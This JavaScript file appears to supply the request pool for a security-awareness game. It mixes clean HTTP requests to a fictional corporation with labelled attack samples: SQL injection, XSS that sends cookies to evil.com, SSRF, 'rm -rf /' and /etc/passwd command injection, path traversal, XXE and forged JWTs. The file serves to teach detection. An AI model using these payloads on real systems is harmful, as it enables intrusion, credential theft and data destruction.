// Request data: realistic-looking HTTP requests for the game

const REQUEST_POOL = [
  // === CLEAN REQUESTS (40%) ===

  {
    isMalicious: false,
    category: 'clean',
    request: {
      timestamp: '2026-04-30 02:47:33 UTC',
      srcIp: '10.24.156.78',
      dest: 'internal.veridian.corp',
      method: 'POST',
      path: '/api/v2/users/auth',
      host: 'api.veridian.corp',
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer eyJhbG...' },
      body: JSON.stringify({
        username: 'sarah.chen@veridian.corp',
        password: '********',
        mfa_code: '847293'
      }, null, 2)
    },
    explanation: 'Clean authentication request from employee VPN.',
    spotDescription: 'Standard corporate auth with valid email format, masked password, and MFA code.'
  },
  {
    isMalicious: false,
    category: 'clean',
    request: {
      timestamp: '2026-04-30 02:51:12 UTC',
      srcIp: '172.18.0.45',
      dest: 'internal.veridian.corp',
      method: 'GET',
      path: '/api/dashboard/stats',
      host: 'dashboard.veridian.corp',
      userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
      headers: { 'Accept': 'application/json' },
      body: null
    },
    explanation: 'Legitimate dashboard statistics API call from internal service.',
    spotDescription: 'Internal service-to-service call, no suspicious payload.'
  },
  {
    isMalicious: false,
    category: 'clean',
    request: {
      timestamp: '2026-04-30 02:53:01 UTC',
      srcIp: '203.0.113.42',
      dest: 'api.veridian.corp',
      method: 'POST',
      path: '/api/v1/employees/update-profile',
      host: 'api.veridian.corp',
      userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)',
      headers: { 'Content-Type': 'application/json', 'X-Employee-ID': 'EMP-7824' },
      body: JSON.stringify({
        displayName: 'Marcus Webb',
        department: 'Engineering',
        phone: '+1-555-0147'
      }, null, 2)
    },
    explanation: 'Clean employee profile update from mobile device.',
    spotDescription: 'Normal profile update with valid field formats and employee ID header.'
  },
  {
    isMalicious: false,
    category: 'clean',
    request: {
      timestamp: '2026-04-30 02:55:44 UTC',
      srcIp: '10.0.15.203',
      dest: 'logs.veridian.corp',
      method: 'POST',
      path: '/ingest',
      host: 'logs.veridian.corp',
      userAgent: 'vector/2.7.0',
      headers: { 'Content-Type': 'application/json', 'X-Ingest-Token': 'vgk_*redacted*' },
      body: JSON.stringify({
        events: [
          { timestamp: '2026-04-30T02:55:44Z', level: 'info', service: 'auth-service', message: 'User logged in' }
        ]
      }, null, 2)
    },
    explanation: 'Legitimate log ingestion from internal monitoring agent.',
    spotDescription: 'Structured log data from authorized monitoring infrastructure.'
  },
  {
    isMalicious: false,
    category: 'clean',
    request: {
      timestamp: '2026-04-30 02:58:19 UTC',
      srcIp: '198.51.100.88',
      dest: 'api.veridian.corp',
      method: 'GET',
      path: '/api/public/announcements',
      host: 'api.veridian.corp',
      userAgent: 'curl/8.1.2',
      headers: { 'Accept': 'application/json' },
      body: null
    },
    explanation: 'Clean public API call to fetch company announcements.',
    spotDescription: 'Public endpoint, no authentication required, no sensitive data.'
  },
  {
    isMalicious: false,
    category: 'clean',
    request: {
      timestamp: '2026-04-30 03:01:07 UTC',
      srcIp: '10.24.156.78',
      dest: 'internal.veridian.corp',
      method: 'PUT',
      path: '/api/documents/VER-2026-0891/content',
      host: 'docs.veridian.corp',
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer eyJhbG...' },
      body: JSON.stringify({
        title: 'Q1 Security Audit Report',
        content: 'Finalized sections 3.4 through 7.2...'
      }, null, 2)
    },
    explanation: 'Legitimate document update from authenticated user.',
    spotDescription: 'Authenticated request to internal document service with proper structure.'
  },
  {
    isMalicious: false,
    category: 'clean',
    request: {
      timestamp: '2026-04-30 03:04:33 UTC',
      srcIp: '203.0.113.42',
      dest: 'api.veridian.corp',
      method: 'GET',
      path: '/api/v2/notifications',
      host: 'api.veridian.corp',
      userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)',
      headers: { 'Authorization': 'Bearer eyJhbG...' },
      body: null
    },
    explanation: 'Clean notification fetch for authenticated mobile user.',
    spotDescription: 'Standard authenticated API call, nothing unusual.'
  },
  {
    isMalicious: false,
    category: 'clean',
    request: {
      timestamp: '2026-04-30 03:07:55 UTC',
      srcIp: '172.18.0.112',
      dest: 'db-proxy.veridian.corp',
      method: 'POST',
      path: '/query',
      host: 'db-proxy.veridian.corp',
      userAgent: 'pg/16.2',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        query: 'SELECT id, name, email FROM employees WHERE department = $1',
        params: ['Engineering']
      }, null, 2)
    },
    explanation: 'Legitimate database query from internal application service.',
    spotDescription: 'Standard parameterized query from authorized service account.'
  },
  {
    isMalicious: false,
    category: 'clean',
    request: {
      timestamp: '2026-04-30 03:11:22 UTC',
      srcIp: '10.24.201.55',
      dest: 'mail.veridian.corp',
      method: 'POST',
      path: '/api/send',
      host: 'mail.veridian.corp',
      userAgent: 'VeridianBot/1.0',
      headers: { 'Content-Type': 'application/json', 'X-Mail-API-Key': 'mk_live_*redacted*' },
      body: JSON.stringify({
        to: 'team-announce@veridian.corp',
        subject: 'Weekly Engineering Sync',
        body: 'Reminder: Weekly sync tomorrow at 10am...'
      }, null, 2)
    },
    explanation: 'Clean internal email dispatch from automation bot.',
    spotDescription: 'Internal service account sending to corporate address, no external delivery.'
  },
  {
    isMalicious: false,
    category: 'clean',
    request: {
      timestamp: '2026-04-30 03:15:01 UTC',
      srcIp: '198.51.100.88',
      dest: 'api.veridian.corp',
      method: 'POST',
      path: '/api/auth/refresh',
      host: 'api.veridian.corp',
      userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        refreshToken: 'rt_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
      }, null, 2)
    },
    explanation: 'Clean token refresh request following standard OAuth flow.',
    spotDescription: 'Standard OAuth refresh with proper token format.'
  },
  {
    isMalicious: false,
    category: 'clean',
    request: {
      timestamp: '2026-04-30 03:18:44 UTC',
      srcIp: '10.24.156.78',
      dest: 'internal.veridian.corp',
      method: 'GET',
      path: '/api/v2/employees/7824/pto-balance',
      host: 'hr.veridian.corp',
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      headers: { 'Authorization': 'Bearer eyJhbG...' },
      body: null
    },
    explanation: 'Clean HR API call for employee PTO balance.',
    spotDescription: 'Standard HR system query with authenticated user context.'
  },
  {
    isMalicious: false,
    category: 'clean',
    request: {
      timestamp: '2026-04-30 03:22:11 UTC',
      srcIp: '172.18.0.89',
      dest: 'cache.veridian.corp',
      method: 'DEL',
      path: '/session/a8f5f7e2-4c3b-...',
      host: 'cache.veridian.corp',
      userAgent: 'redis-cli/7.0',
      headers: {},
      body: null
    },
    explanation: 'Legitimate session cleanup from cache service.',
    spotDescription: 'Internal cache maintenance operation, nothing suspicious.'
  },

  // === MALICIOUS REQUESTS (60%) ===

  // SQL Injection
  {
    isMalicious: true,
    category: 'SQL Injection',
    damage: 20,
    request: {
      timestamp: '2026-04-30 02:49:17 UTC',
      srcIp: '185.234.72.19',
      dest: 'api.veridian.corp',
      method: 'POST',
      path: '/api/v2/users/auth',
      host: 'api.veridian.corp',
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: "admin'--",
        password: "anything"
      }, null, 2)
    },
    explanation: 'SQL injection attempt via username field. The payload closes the query and comments out the password check, attempting to authenticate as admin.',
    spotDescription: 'The username "admin\'--" is a classic SQL injection pattern — a quote to escape the string, followed by SQL comment operator to nullify the rest of the query.'
  },
  {
    isMalicious: true,
    category: 'SQL Injection',
    damage: 22,
    request: {
      timestamp: '2026-04-30 02:56:28 UTC',
      srcIp: '89.248.167.131',
      dest: 'api.veridian.corp',
      method: 'GET',
      path: '/api/users?id=1 OR 1=1',
      host: 'api.veridian.corp',
      userAgent: 'python-requests/2.31.0',
      headers: { 'Accept': 'application/json' },
      body: null
    },
    explanation: 'SQL injection via URL parameter. "OR 1=1" is a universal truth that would return all records if not sanitized.',
    spotDescription: 'The query parameter contains raw SQL: "1 OR 1=1". A legitimate query would use parameterized input, not raw SQL in the URL.'
  },
  {
    isMalicious: true,
    category: 'SQL Injection',
    damage: 18,
    request: {
      timestamp: '2026-04-30 03:08:39 UTC',
      srcIp: '185.234.72.19',
      dest: 'search.veridian.corp',
      method: 'POST',
      path: '/api/search',
      host: 'search.veridian.corp',
      userAgent: 'Mozilla/5.0 (X11; Linux x86_64)',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        query: "electronics' UNION SELECT NULL,username,password FROM users--"
      }, null, 2)
    },
    explanation: 'UNION-based SQL injection attempting to extract user credentials from the database.',
    spotDescription: 'The search query contains a UNION SELECT injection, attempting to append a second query to the original.'
  },

  // XSS
  {
    isMalicious: true,
    category: 'XSS',
    damage: 15,
    request: {
      timestamp: '2026-04-30 02:52:03 UTC',
      srcIp: '198.51.100.23',
      dest: 'feedback.veridian.corp',
      method: 'POST',
      path: '/api/feedback',
      host: 'feedback.veridian.corp',
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        message: 'Great service! <script>fetch("https://evil.com/steal?c="+document.cookie)</script>'
      }, null, 2)
    },
    explanation: 'Stored XSS attempt via feedback form. The script tag would execute when the feedback is viewed, exfiltrating session cookies.',
    spotDescription: 'The payload contains a <script> tag embedded in what appears to be user feedback. This is a classic stored XSS pattern.'
  },
  {
    isMalicious: true,
    category: 'XSS',
    damage: 12,
    request: {
      timestamp: '2026-04-30 03:05:17 UTC',
      srcIp: '203.0.113.67',
      dest: 'api.veridian.corp',
      method: 'GET',
      path: '/api/display?name=%3Cimg%20src=x%20onerror=%22alert(document.domain)%22%3E',
      host: 'api.veridian.corp',
      userAgent: 'curl/8.1.2',
      headers: { 'Accept': 'application/json' },
      body: null
    },
    explanation: 'XSS attempt via URL parameter encoding. The payload uses img onerror to execute JavaScript.',
    spotDescription: 'The URL-encoded parameter contains an img tag with an onerror handler — a common XSS vector when user input is reflected without escaping.'
  },
  {
    isMalicious: true,
    category: 'XSS',
    damage: 10,
    request: {
      timestamp: '2026-04-30 03:14:52 UTC',
      srcIp: '198.51.100.23',
      dest: 'comments.veridian.corp',
      method: 'POST',
      path: '/api/comments',
      host: 'comments.veridian.corp',
      userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        comment: 'Nice work! <svg onload=fetch("https://evil.net/log?d="+btoa(document.cookie))>'
      }, null, 2)
    },
    explanation: 'Stored XSS using SVG tag with onload event. When rendered, it will steal session cookies.',
    spotDescription: 'The SVG onload vector is a modern XSS technique that bypasses some basic filters.'
  },

  // SSRF
  {
    isMalicious: true,
    category: 'SSRF',
    damage: 25,
    request: {
      timestamp: '2026-04-30 02:59:33 UTC',
      srcIp: '185.234.72.19',
      dest: 'api.veridian.corp',
      method: 'POST',
      path: '/api/webhook/test',
      host: 'api.veridian.corp',
      userAgent: 'python-requests/2.31.0',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        url: 'http://169.254.169.254/latest/meta-data/'
      }, null, 2)
    },
    explanation: 'SSRF attack targeting AWS metadata endpoint. This attempts to fetch cloud instance credentials from the internal metadata service.',
    spotDescription: '169.254.169.254 is the AWS metadata IP address. A legitimate webhook would never need to access cloud provider metadata.'
  },
  {
    isMalicious: true,
    category: 'SSRF',
    damage: 22,
    request: {
      timestamp: '2026-04-30 03:03:18 UTC',
      srcIp: '89.248.167.131',
      dest: 'api.veridian.corp',
      method: 'GET',
      path: '/api/fetch?url=http://10.0.0.5:8080/admin',
      host: 'api.veridian.corp',
      userAgent: 'Go-http-client/1.1',
      headers: { 'Accept': 'application/json' },
      body: null
    },
    explanation: 'SSRF targeting internal network range. This attempts to access an internal admin interface at 10.0.0.5.',
    spotDescription: 'The 10.x range is a private internal network. The path /admin suggests probing internal services for vulnerabilities.'
  },
  {
    isMalicious: true,
    category: 'SSRF',
    damage: 28,
    request: {
      timestamp: '2026-04-30 03:19:41 UTC',
      srcIp: '185.234.72.19',
      dest: 'api.veridian.corp',
      method: 'POST',
      path: '/api/og-image',
      host: 'api.veridian.corp',
      userAgent: 'python-requests/2.31.0',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        url: 'file:///etc/passwd'
      }, null, 2)
    },
    explanation: 'SSRF using file:// protocol to read local filesystem. Could expose sensitive configuration and credential files.',
    spotDescription: 'The file:// protocol should never be allowed in a URL fetcher. This is a direct attempt to read local files.'
  },

  // Command Injection
  {
    isMalicious: true,
    category: 'Command Injection',
    damage: 30,
    request: {
      timestamp: '2026-04-30 02:45:52 UTC',
      srcIp: '185.234.72.19',
      dest: 'build.veridian.corp',
      method: 'POST',
      path: '/api/deploy',
      host: 'build.veridian.corp',
      userAgent: 'curl/8.1.2',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        branch: 'main',
        tag: 'v2.1.0; rm -rf / --no-preserve-root'
      }, null, 2)
    },
    explanation: 'Command injection via tag parameter. The semicolon chains a destructive rm command that would wipe the filesystem.',
    spotDescription: 'The tag contains a semicolon followed by "rm -rf /". This should never appear in a legitimate deployment parameter.'
  },
  {
    isMalicious: true,
    category: 'Command Injection',
    damage: 32,
    request: {
      timestamp: '2026-04-30 03:12:07 UTC',
      srcIp: '185.234.72.19',
      dest: 'api.veridian.corp',
      method: 'GET',
      path: '/api/ping?host=google.com%3B%20cat%20%2Fetc%2Fpasswd',
      host: 'api.veridian.corp',
      userAgent: 'python-requests/2.31.0',
      headers: { 'Accept': 'application/json' },
      body: null
    },
    explanation: 'Command injection via ping parameter. The URL-encoded semicolon chains a command to read /etc/passwd.',
    spotDescription: 'A ping utility should never accept commands after the host parameter. The %3B URL-encodes a semicolon — command chaining.'
  },
  {
    isMalicious: true,
    category: 'Command Injection',
    damage: 28,
    request: {
      timestamp: '2026-04-30 03:24:19 UTC',
      srcIp: '89.248.167.131',
      dest: 'api.veridian.corp',
      method: 'POST',
      path: '/api/exec',
      host: 'api.veridian.corp',
      userAgent: 'Mozilla/5.0',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        cmd: '$(whoami)'
      }, null, 2)
    },
    explanation: 'Command injection using $() subshell syntax. This attempts to execute "whoami" on the target system.',
    spotDescription: 'The $(...) syntax is command substitution. A legitimate API would never accept raw shell commands in JSON fields.'
  },

  // Credential Stuffing
  {
    isMalicious: true,
    category: 'Credential Stuffing',
    damage: 18,
    request: {
      timestamp: '2026-04-30 02:47:18 UTC',
      srcIp: '45.227.34.107',
      dest: 'api.veridian.corp',
      method: 'POST',
      path: '/api/v2/users/auth',
      host: 'api.veridian.corp',
      userAgent: 'python-requests/2.31.0',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'admin@veridian.corp',
        password: 'password123'
      }, null, 2)
    },
    explanation: 'Credential stuffing attempt using known breach combo. The password "password123" appears in most common password lists.',
    spotDescription: 'The IP is from a known proxy range. The combination of admin@company.com with "password123" is a textbook credential stuffing pattern.'
  },
  {
    isMalicious: true,
    category: 'Credential Stuffing',
    damage: 20,
    request: {
      timestamp: '2026-04-30 03:01:55 UTC',
      srcIp: '45.227.34.107',
      dest: 'api.veridian.corp',
      method: 'POST',
      path: '/api/v2/users/auth',
      host: 'api.veridian.corp',
      userAgent: 'python-requests/2.31.0',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'helpdesk@veridian.corp',
        password: 'Summer2026!'
      }, null, 2)
    },
    explanation: 'Credential stuffing with a targeted guess at a service account. The password follows a common seasonal pattern.',
    spotDescription: 'Multiple attempts from the same IP with different credentials is a credential stuffing signature.'
  },

  // Path Traversal
  {
    isMalicious: true,
    category: 'Path Traversal',
    damage: 22,
    request: {
      timestamp: '2026-04-30 02:50:41 UTC',
      srcIp: '185.234.72.19',
      dest: 'files.veridian.corp',
      method: 'GET',
      path: '/download?file=../../etc/passwd',
      host: 'files.veridian.corp',
      userAgent: 'curl/8.1.2',
      headers: { 'Accept': '*/*' },
      body: null
    },
    explanation: 'Path traversal attack attempting to read /etc/passwd. The ../ sequences escape the intended upload directory.',
    spotDescription: 'The parameter contains "../" sequences — a classic path traversal pattern to escape the intended directory.'
  },
  {
    isMalicious: true,
    category: 'Path Traversal',
    damage: 20,
    request: {
      timestamp: '2026-04-30 03:09:33 UTC',
      srcIp: '89.248.167.131',
      dest: 'api.veridian.corp',
      method: 'GET',
      path: '/api/logs?name=..\\..\\windows\\system32\\config\\sam',
      host: 'api.veridian.corp',
      userAgent: 'python-requests/2.31.0',
      headers: { 'Accept': 'application/json' },
      body: null
    },
    explanation: 'Windows path traversal targeting the SAM file (password hashes). Backslash sequences are the Windows equivalent of ../.',
    spotDescription: 'The path attempts to access Windows system files outside the web root. The SAM file contains password hashes.'
  },
  {
    isMalicious: true,
    category: 'Path Traversal',
    damage: 25,
    request: {
      timestamp: '2026-04-30 03:21:08 UTC',
      srcIp: '185.234.72.19',
      dest: 'backup.veridian.corp',
      method: 'GET',
      path: '/api/backup?path=../../var/www/html/.env',
      host: 'backup.veridian.corp',
      userAgent: 'curl/8.1.2',
      headers: { 'Accept': '*/*' },
      body: null
    },
    explanation: 'Path traversal targeting the .env file to steal application secrets and API keys.',
    spotDescription: '.env files contain application secrets. A backup API should only work within the backup directory, not arbitrary paths.'
  },

  // Fake Malware Download
  {
    isMalicious: true,
    category: 'Fake Malware Download',
    damage: 25,
    request: {
      timestamp: '2026-04-30 02:44:07 UTC',
      srcIp: '185.234.72.19',
      dest: 'cdn.veridian.corp',
      method: 'GET',
      path: '/downloads/update.exe',
      host: 'cdn.veridian.corp',
      userAgent: 'Microsoft-CryptoAPI/10.0',
      headers: { 'Accept': '*/*', 'Referer': 'https://veridian.corp/' },
      body: null
    },
    explanation: 'Fake Windows update targeting corporate machines. The user agent claims to be Microsoft CryptoAPI to avoid suspicion.',
    spotDescription: 'CDN serving .exe files is unusual. The Microsoft-CryptoAPI user-agent and Referer spoofing are social engineering tactics.'
  },
  {
    isMalicious: true,
    category: 'Fake Malware Download',
    damage: 22,
    request: {
      timestamp: '2026-04-30 03:16:44 UTC',
      srcIp: '198.51.100.89',
      dest: 'cdn.veridian.corp',
      method: 'GET',
      path: '/assets/invoice_VRD_2026.pdf.exe',
      host: 'cdn.veridian.corp',
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      headers: { 'Accept': 'application/pdf,*/*' },
      body: null
    },
    explanation: 'Double-extension malware disguised as a PDF invoice. The .exe is hidden by the fake .pdf extension.',
    spotDescription: 'Invoice_VRD_2026.pdf.exe has a double extension — a common malware delivery technique. PDFs would not be served as .exe.'
  },
  {
    isMalicious: true,
    category: 'Fake Malware Download',
    damage: 28,
    request: {
      timestamp: '2026-04-30 03:26:31 UTC',
      srcIp: '185.234.72.19',
      dest: 'downloads.veridian.corp',
      method: 'GET',
      path: '/secure-patch-kb5034441.msi',
      host: 'downloads.veridian.corp',
      userAgent: 'WindowsUpdate/10.0',
      headers: { 'Accept': '*/*' },
      body: null
    },
    explanation: 'Fake Windows security update distributing ransomware. The KB5034441 reference is legitimate but the download source is not.',
    spotDescription: 'Legitimate Windows updates come from Microsoft Update servers, not internal download domains with no prior announcement.'
  },

  // Auth Bypass
  {
    isMalicious: true,
    category: 'Auth Bypass',
    damage: 30,
    request: {
      timestamp: '2026-04-30 02:41:19 UTC',
      srcIp: '185.234.72.19',
      dest: 'api.veridian.corp',
      method: 'GET',
      path: '/api/admin/users',
      host: 'api.veridian.corp',
      userAgent: 'python-requests/2.31.0',
      headers: { 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiYWRtaW4iOnRydWUsImlhdCI6MTcwOTMxMTYwMH0.fake' },
      body: null
    },
    explanation: 'JWT manipulation attempt. The token contains admin:true claim with a fake signature, attempting privilege escalation.',
    spotDescription: 'JWTs with "admin":true in the payload and obviously fake signatures (ending in "fake") are auth bypass attempts.'
  },
  {
    isMalicious: true,
    category: 'Auth Bypass',
    damage: 28,
    request: {
      timestamp: '2026-04-30 03:07:21 UTC',
      srcIp: '185.234.72.19',
      dest: 'api.veridian.corp',
      method: 'GET',
      path: '/api/users/1',
      host: 'api.veridian.corp',
      userAgent: 'python-requests/2.31.0',
      headers: { 'Accept': 'application/json' },
      body: null
    },
    explanation: 'Direct Object Reference attack. Attempting to access user ID 1 (often the admin) without authentication.',
    spotDescription: 'Direct access to /api/users/1 without authentication is an IDOR probe. The lack of auth headers is suspicious on a protected endpoint.'
  },
  {
    isMalicious: true,
    category: 'Auth Bypass',
    damage: 35,
    request: {
      timestamp: '2026-04-30 03:23:58 UTC',
      srcIp: '89.248.167.131',
      dest: 'api.veridian.corp',
      method: 'POST',
      path: '/api/auth/login',
      host: 'api.veridian.corp',
      userAgent: 'python-requests/2.31.0',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        role: 'admin',
        bypass_mfa: true
      }, null, 2)
    },
    explanation: 'Authentication bypass attempt. The request attempts to force an admin role and MFA bypass in a single login attempt.',
    spotDescription: 'The presence of role and bypass_mfa fields in a login request is a red flag — these should never be client-controlled.'
  },

  // XXE
  {
    isMalicious: true,
    category: 'XXE',
    damage: 25,
    request: {
      timestamp: '2026-04-30 02:55:12 UTC',
      srcIp: '185.234.72.19',
      dest: 'parser.veridian.corp',
      method: 'POST',
      path: '/api/xml/parse',
      host: 'parser.veridian.corp',
      userAgent: 'python-requests/2.31.0',
      headers: { 'Content-Type': 'application/xml' },
      body: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<doc>&xxe;</doc>`
    },
    explanation: 'XXE (XML External Entity) injection to read local files. The doctype entity definition loads /etc/passwd.',
    spotDescription: 'XML with DOCTYPE containing an ENTITY definition loading a local file is an XXE attack signature.'
  },

  // RCE via Deserialization
  {
    isMalicious: true,
    category: 'Insecure Deserialization',
    damage: 35,
    request: {
      timestamp: '2026-04-30 03:00:44 UTC',
      srcIp: '185.234.72.19',
      dest: 'api.veridian.corp',
      method: 'POST',
      path: '/api/serialize',
      host: 'api.veridian.corp',
      userAgent: 'python-requests/2.31.0',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        data: 'O:8:"stdClass":2:{s:4:"cmd";s:12:"whoami";s:3:"out";s:0:"";}'
      }, null, 2)
    },
    explanation: 'PHP object injection attempt. The serialized string contains a stdClass with a "cmd" property, potentially leading to RCE.',
    spotDescription: 'Serialized PHP objects with property names like "cmd" and "out" in JSON context suggest insecure deserialization exploitation.'
  }
];

// Shuffle array (Fisher-Yates)
function shuffle(array) {
  const arr = [...array];
  for (let i = arr.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [arr[i], arr[j]] = [arr[j], arr[i]];
  }
  return arr;
}

// Generate a unique request ID
function generateId() {
  return Math.random().toString(36).substring(2, 6).toUpperCase();
}

// Get request pool shuffled once at game start
let requestPool = [];
let poolIndex = 0;

export function initPool() {
  requestPool = shuffle(REQUEST_POOL);
  poolIndex = 0;
}

export function getNextRequest() {
  if (poolIndex >= requestPool.length) {
    // Reshuffle and continue
    requestPool = shuffle(REQUEST_POOL);
    poolIndex = 0;
  }
  const template = requestPool[poolIndex++];
  return {
    id: generateId(),
    ...template
  };
}

export const CATEGORIES = [
  'SQL Injection',
  'XSS',
  'SSRF',
  'Command Injection',
  'Credential Stuffing',
  'Path Traversal',
  'Fake Malware Download',
  'Auth Bypass',
  'XXE',
  'Insecure Deserialization'
];